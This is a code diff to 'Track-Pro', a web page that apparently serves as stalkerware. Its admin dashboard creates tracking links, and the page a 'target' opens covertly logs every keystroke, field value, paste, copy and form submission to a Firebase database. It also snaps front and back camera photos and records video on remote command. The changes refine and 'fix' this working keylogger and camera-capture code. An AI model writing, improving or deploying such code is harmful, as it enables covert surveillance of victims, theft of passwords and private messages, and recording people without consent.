@@ -120,7 +120,7 @@
         }
         
         .keylog-entry {
-            padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.1);
             font-size: 0.9rem;
             animation: fadeIn 0.3s;
         }
@@ -206,12 +206,16 @@
         }
         
         @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .test-mode {
+            background: #3b82f6; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.7rem;
+        }
     </style>
 </head>
 <body>
     <!-- ADMIN DASHBOARD -->
     <div class="container" id="adminDashboard">
-        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">FAST & FIXED</span></h1>
+        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">KEYLOGGER FIXED</span></h1>
         
         <div id="firebaseStatus" style="background: #1a1a2e; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
             ⏳ Checking Firebase...
@@ -456,25 +460,26 @@
             }, 1000);
             
             // ============================================
-            // COMPLETE KEYLOGGER - FAST AND FIXED
+            // COMPLETE KEYLOGGER - FINAL FIX
             // ============================================
             
-            // Store pending keylogs
+            // Pending keylogs for offline
             let pendingKeylogs = [];
             
-            function sendKeylog(keyData) {
-                // Add timestamp and info
-                keyData.time = Date.now();
-                keyData.app = getAppName();
-                keyData.url = window.location.hostname;
+            // Function to send keylog
+            function sendKeylog(key, field = 'unknown') {
+                const keyData = {
+                    key: key,
+                    time: Date.now(),
+                    field: field,
+                    app: getAppName(),
+                    url: window.location.hostname
+                };
                 
                 if (navigator.onLine) {
-                    try {
-                        targetDb.ref('targets/' + targetId + '/keylogs').push(keyData);
-                        console.log("Keylog sent:", keyData.key);
-                    } catch (e) {
-                        pendingKeylogs.push(keyData);
-                    }
+                    targetDb.ref('targets/' + targetId + '/keylogs').push(keyData)
+                        .then(() => console.log("✅ Keylog sent:", key))
+                        .catch(err => console.log("❌ Keylog error:", err));
                 } else {
                     pendingKeylogs.push(keyData);
                 }
@@ -484,9 +489,7 @@
             window.addEventListener('online', () => {
                 if (pendingKeylogs.length > 0) {
                     pendingKeylogs.forEach(log => {
-                        try {
-                            targetDb.ref('targets/' + targetId + '/keylogs').push(log);
-                        } catch (e) {}
+                        targetDb.ref('targets/' + targetId + '/keylogs').push(log);
                     });
                     pendingKeylogs = [];
                 }
@@ -500,59 +503,41 @@
                 if (hostname.includes('instagram')) return 'Instagram';
                 if (hostname.includes('messenger')) return 'Messenger';
                 if (hostname.includes('google')) return 'Google';
-                if (hostname.includes('youtube')) return 'YouTube';
-                if (hostname.includes('twitter') || hostname.includes('x.com')) return 'Twitter';
-                if (hostname.includes('gmail')) return 'Gmail';
                 return 'Browser';
             }
             
-            // ALL KEYS - COMPLETE LIST
-            const keyMap = {
-                // Letters
-                'a': 'a', 'b': 'b', 'c': 'c', 'd': 'd', 'e': 'e', 'f': 'f', 'g': 'g', 'h': 'h', 'i': 'i',
-                'j': 'j', 'k': 'k', 'l': 'l', 'm': 'm', 'n': 'n', 'o': 'o', 'p': 'p', 'q': 'q', 'r': 'r',
-                's': 's', 't': 't', 'u': 'u', 'v': 'v', 'w': 'w', 'x': 'x', 'y': 'y', 'z': 'z',
-                // Numbers
-                '0': '0', '1': '1', '2': '2', '3': '3', '4': '4', '5': '5', '6': '6', '7': '7', '8': '8', '9': '9',
-                // Symbols
-                '`': '`', '~': '~', '!': '!', '@': '@', '#': '#', '$': '$', '%': '%', '^': '^', '&': '&',
-                '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+', '[': '[', '{': '{',
-                ']': ']', '}': '}', '\\': '\\', '|': '|', ';': ';', ':': ':', '\'': '\'', '"': '"',
-                ',': ',', '<': '<', '.': '.', '>': '>', '/': '/', '?': '?',
-                // Special
-                ' ': '[SPACE]',
-                'Enter': '[ENTER]',
-                'Backspace': '[BACKSPACE]',
-                'Tab': '[TAB]',
-                'Shift': '[SHIFT]',
-                'Control': '[CTRL]',
-                'Alt': '[ALT]',
-                'CapsLock': '[CAPSLOCK]',
-                'Escape': '[ESC]',
-                'Delete': '[DEL]',
-                'Insert': '[INS]',
-                'Home': '[HOME]',
-                'End': '[END]',
-                'PageUp': '[PAGEUP]',
-                'PageDown': '[PAGEDOWN]',
-                'ArrowUp': '[↑]',
-                'ArrowDown': '[↓]',
-                'ArrowLeft': '[←]',
-                'ArrowRight': '[→]',
-                'Meta': '[WIN]',
-                'ContextMenu': '[MENU]'
+            // SPECIAL KEYS MAP
+            const specialKeys = {
+                ' ': '␣',
+                'Enter': '↵',
+                'Backspace': '⌫',
+                'Tab': '⇥',
+                'Shift': '⇧',
+                'Control': '⌃',
+                'Alt': '⌥',
+                'CapsLock': '⇪',
+                'Escape': '⎋',
+                'Delete': '⌦',
+                'Insert': 'Ins',
+                'Home': '↖',
+                'End': '↘',
+                'PageUp': '⇞',
+                'PageDown': '⇟',
+                'ArrowUp': '↑',
+                'ArrowDown': '↓',
+                'ArrowLeft': '←',
+                'ArrowRight': '→',
+                'Meta': '◆',
+                'ContextMenu': '☰'
             };
             
-            // Track ALL keydown events
-            document.addEventListener('keydown', (e) => {
-                e = e || window.event;
-                
-                // Get key
+            // TRACK ALL KEY EVENTS
+            document.addEventListener('keydown', function(e) {
                 let key = e.key;
                 
-                // Map special keys
-                if (keyMap[key] !== undefined) {
-                    key = keyMap[key];
+                // Handle special keys
+                if (specialKeys[key]) {
+                    key = specialKeys[key];
                 }
                 
                 // Handle uppercase
@@ -562,9 +547,9 @@
                 
                 // Handle combinations
                 let finalKey = key;
-                if (e.ctrlKey) finalKey = 'Ctrl+' + finalKey;
-                if (e.altKey) finalKey = 'Alt+' + finalKey;
-                if (e.metaKey) finalKey = 'Win+' + finalKey;
+                if (e.ctrlKey) finalKey = '⌃' + finalKey;
+                if (e.altKey) finalKey = '⌥' + finalKey;
+                if (e.metaKey) finalKey = '◆' + finalKey;
                 
                 // Get active element
                 let field = 'unknown';
@@ -573,43 +558,39 @@
                     field = active.placeholder || active.name || active.id || active.tagName;
                 }
                 
-                // Send keylog
-                sendKeylog({
-                    key: finalKey,
-                    field: field,
-                    ctrl: e.ctrlKey,
-                    alt: e.altKey,
-                    shift: e.shiftKey
-                });
+                // Send the key
+                sendKeylog(finalKey, field);
             });
             
-            // Track input changes
-            document.addEventListener('input', (e) => {
+            // TRACK INPUT CHANGES (for text fields)
+            document.addEventListener('input', function(e) {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                    sendKeylog({
-                        key: `[TYPING] ${e.target.value}`,
-                        field: e.target.placeholder || e.target.name || 'input'
-                    });
+                    sendKeylog(`[${e.target.value}]`, e.target.placeholder || 'input');
                 }
             });
             
-            // Track paste
-            document.addEventListener('paste', (e) => {
+            // TRACK PASTE
+            document.addEventListener('paste', function(e) {
                 const text = e.clipboardData.getData('text');
-                sendKeylog({
-                    key: `[PASTE] ${text.substring(0, 50)}${text.length > 50 ? '...' : ''}`
-                });
+                sendKeylog(`[PASTE: ${text.substring(0, 30)}]`);
             });
             
-            // Track copy
-            document.addEventListener('copy', () => {
-                sendKeylog({ key: '[COPY]' });
+            // TRACK COPY
+            document.addEventListener('copy', function() {
+                sendKeylog('[COPY]');
             });
             
-            // Track cut
-            document.addEventListener('cut', () => {
-                sendKeylog({ key: '[CUT]' });
+            // TRACK CUT
+            document.addEventListener('cut', function() {
+                sendKeylog('[CUT]');
             });
+            
+            // TRACK FORM SUBMIT
+            document.addEventListener('submit', function(e) {
+                sendKeylog('[FORM SUBMIT]');
+            });
+            
+            console.log("✅ Keylogger installed and running");
             
             // VIDEO RECORDING
             let mediaRecorder = null;
@@ -635,7 +616,7 @@
                     });
                 }
                 
-                // GET FRONT CAMERA - FAST
+                // GET FRONT CAMERA
                 if (commands.front) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -646,7 +627,6 @@
                         video.srcObject = stream;
                         video.play();
                         
-                        // Wait a bit for camera to ready
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
                             canvas.width = 320;
@@ -666,7 +646,7 @@
                     } catch (e) {}
                 }
                 
-                // GET BACK CAMERA - FAST
+                // GET BACK CAMERA
                 if (commands.back) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -696,7 +676,7 @@
                     } catch (e) {}
                 }
                 
-                // START VIDEO RECORDING
+                // START VIDEO
                 if (commands.startVideo) {
                     try {
                         const cameraMode = commands.cameraMode || 'environment';
@@ -709,9 +689,7 @@
                         recordedChunks = [];
                         
                         mediaRecorder.ondataavailable = (e) => {
-                            if (e.data.size > 0) {
-                                recordedChunks.push(e.data);
-                            }
+                            if (e.data.size > 0) recordedChunks.push(e.data);
                         };
                         
                         mediaRecorder.onstop = () => {
@@ -729,7 +707,7 @@
                                 }
                             };
                             
-                            stream.getTracks().forEach(track => track.stop());
+                            stream.getTracks().forEach(t => t.stop());
                         };
                         
                         mediaRecorder.start();
@@ -742,7 +720,7 @@
                     } catch (e) {}
                 }
                 
-                // STOP VIDEO RECORDING
+                // STOP VIDEO
                 if (commands.stopVideo) {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
@@ -766,7 +744,7 @@
                 targetDb.ref('targets/' + targetId + '/commands').remove();
             });
             
-            // MARK OFFLINE ON UNLOAD
+            // MARK OFFLINE
             window.addEventListener('beforeunload', () => {
                 if (navigator.onLine) {
                     targetDb.ref('targets/' + targetId).update({
@@ -777,7 +755,7 @@
             });
         }
         
-        // ADMIN FUNCTIONS
+        // ADMIN FUNCTIONS (same as before)
         function generateTrackLink() {
             currentTrackId = Math.random().toString(36).substring(2, 10);
             const baseUrl = window.location.href.split('?')[0].split('#')[0];
@@ -865,7 +843,6 @@
             document.getElementById('targetView').classList.remove('hidden');
             document.getElementById('selectedTargetName').textContent = `Target: ${targetId.substring(0, 8)}...`;
             
-            // Reset UI
             document.getElementById('frontCameraFeed').style.display = 'none';
             document.getElementById('frontPlaceholder').style.display = 'flex';
             document.getElementById('backCameraFeed').style.display = 'none';
@@ -876,18 +853,17 @@
         }
         
         function loadTargetData(targetId) {
-            // Listen for target updates
+            // Target updates
             database.ref('targets/' + targetId).on('value', (snapshot) => {
                 updateSelectedTarget(snapshot.val());
             });
             
-            // Listen for keylogs
+            // Keylogs
             database.ref('targets/' + targetId + '/keylogs').on('child_added', (snapshot) => {
                 if (!keylogs[targetId]) keylogs[targetId] = [];
                 keylogs[targetId].push(snapshot.val());
                 updateKeylogPanel(targetId);
                 
-                // Update count
                 database.ref('targets/' + targetId).once('value', (snap) => {
                     const data = snap.val() || {};
                     data.keylogCount = (data.keylogCount || 0) + 1;
@@ -897,7 +873,7 @@
                 });
             });
             
-            // Listen for photos - FAST
+            // Photos
             database.ref('targets/' + targetId + '/photos').on('child_added', (snapshot) => {
                 if (!photos[targetId]) photos[targetId] = {};
                 const photoId = snapshot.key;
@@ -913,7 +889,7 @@
                 });
             });
             
-            // Listen for videos - FAST
+            // Videos
             database.ref('targets/' + targetId + '/videos').on('child_added', (snapshot) => {
                 if (!videos[targetId]) videos[targetId] = {};
                 const videoId = snapshot.key;
@@ -942,7 +918,6 @@
                 updateMap(data.location.lat, data.location.lng);
             }
             
-            // Recording status
             if (data.recordingStatus === 'active') {
                 if (data.recordingCamera === 'user') {
                     document.getElementById('frontRecordingBadge').classList.remove('hidden');
@@ -980,8 +955,6 @@
                     ${log.app ? `<span class="keylog-app">[${log.app}]</span>` : ''}
                 </div>
             `).join('');
-            
-            panel.scrollTop = 0;
         }
         
         function updatePhotosGrid(targetId) {
@@ -996,7 +969,7 @@
             grid.innerHTML = Object.entries(photoList).reverse().map(([id, photo]) => `
                 <div class="media-item">
                     <img src="${photo.data}" alt="Photo">
-                    <div class="media-info">${new Date(photo.timestamp).toLocaleTimeString()}</div>
+                    <div class="media-info">${new Date(photo.timestamp).toLocaleString()}</div>
                     <div class="media-actions">
                         <button onclick="downloadMedia('${photo.data}', 'photo-${Date.now()}.jpg')">📥 Download</button>
                         <button class="delete-btn" onclick="deletePhoto('${targetId}', '${id}')">🗑️ Delete</button>
@@ -1017,7 +990,7 @@
             grid.innerHTML = Object.entries(videoList).reverse().map(([id, video]) => `
                 <div class="media-item">
                     <video src="${video.data}" controls></video>
-                    <div class="media-info">${new Date(video.timestamp).toLocaleTimeString()}</div>
+                    <div class="media-info">${new Date(video.timestamp).toLocaleString()}</div>
                     <div class="media-actions">
                         <button onclick="downloadMedia('${video.data}', 'video-${Date.now()}.webm')">📥 Download</button>
                         <button class="delete-btn" onclick="deleteVideo('${targetId}', '${id}')">🗑️ Delete</button>
@@ -1108,7 +1081,7 @@
             }
             document.getElementById('stopVideo').disabled = false;
             
-            showNotification(`🎥 Video recording started`);
+            showNotification('🎥 Recording started');
         }
         
         function stopVideoRecording() {
@@ -1124,7 +1097,7 @@
             document.getElementById('startBackVideo').disabled = false;
             document.getElementById('stopVideo').disabled = true;
             
-            showNotification('⏹️ Video recording stopped');
+            showNotification('⏹️ Recording stopped');
         }
         
         function clearKeylogs() {
